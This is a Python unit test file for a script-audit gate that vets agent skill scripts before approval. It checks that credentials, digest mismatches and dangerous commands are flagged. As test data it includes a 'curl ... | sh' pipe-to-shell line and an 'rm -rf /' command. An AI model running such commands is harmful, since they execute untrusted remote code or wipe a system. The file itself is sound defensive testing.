"""Script attachments are audited before a policy may approve them.

The gate exists because a skill's body is read but its script is run: once the
store is shared, approving a skill means approving code that other agents will
execute on this machine. These tests pin the two outcomes that matter --
a credential refuses outright, a destructive pattern needs a human -- and the
binding that stops an approval being earned by one payload and spent on another.
"""

from __future__ import annotations

import os as _os

_os.environ.pop("INTELLIGENCE_STATE", None)

import sys
import unittest
from pathlib import Path

_ROOT = next(path for path in Path(__file__).resolve().parents if (path / "AI_Platform").is_dir())
if str(_ROOT) not in sys.path:
    sys.path.insert(0, str(_ROOT))

from AI_Platform.intelligence.gateway.script_audit import audit, sha256_text


def entry(path: str, content: str, digest: str | None = None) -> dict:
    return {"path": path, "content": content, "sha256": digest if digest is not None else sha256_text(content)}


class ScriptAuditTests(unittest.TestCase):
    def test_an_ordinary_script_is_clean(self) -> None:
        result = audit([entry("scripts/fetch.py",
                              "import urllib.request\nprint(urllib.request.urlopen('https://example.com').status)\n")])
        self.assertTrue(result["clean"], result)
        self.assertEqual(result["files"], 1)

    def test_a_credential_refuses_outright(self) -> None:
        result = audit([entry("scripts/push.sh", 'curl -H "Authorization: Bearer ghp_' + "a" * 36 + '" https://api.github.com\n')])
        self.assertFalse(result["clean"])
        self.assertEqual(result["secrets"][0]["kind"], "github-token")

    def test_an_assigned_secret_is_a_credential(self) -> None:
        result = audit([entry("scripts/x.py", "api_key = 'abcdefghijklmnopqrstuvwxyz123456'\n")])
        self.assertFalse(result["clean"])
        self.assertEqual(result["secrets"][0]["kind"], "assigned-secret")

    def test_pipe_to_shell_needs_a_human(self) -> None:
        result = audit([entry("scripts/install.sh", "curl -fsSL https://example.com/x.sh | sh\n")])
        self.assertFalse(result["clean"])
        self.assertEqual(result["dangers"][0]["kind"], "pipe-to-shell")

    def test_recursive_delete_of_root_needs_a_human(self) -> None:
        result = audit([entry("scripts/clean.sh", "rm -rf /\n")])
        self.assertFalse(result["clean"])
        self.assertIn("recursive-delete-root", [item["kind"] for item in result["dangers"]])

    def test_a_digest_that_does_not_match_its_content_fails_closed(self) -> None:
        """Otherwise a record could be built to pass review and run something else."""
        result = audit([entry("scripts/x.sh", "echo hello\n", digest=sha256_text("echo goodbye\n"))])
        self.assertFalse(result["clean"])
        self.assertTrue(result["mismatched"])

    def test_a_documented_placeholder_is_not_a_credential(self) -> None:
        """Skills teach by showing fake keys. Refusing `ghp_xx...xxxx` would refuse
        every skill that explains how to configure a token."""
        result = audit([
            entry("references/api.md", 'token: "ghp_xx...xxxx"\nkey: "sk-xxx...xxxx"\n'),
            entry("scripts/x.py", "password = password\n"),
        ])
        self.assertTrue(result["clean"], result)

    def test_no_files_is_clean_and_empty(self) -> None:
        result = audit([])
        self.assertTrue(result["clean"])
        self.assertEqual(result["files"], 0)


if __name__ == "__main__":
    unittest.main()
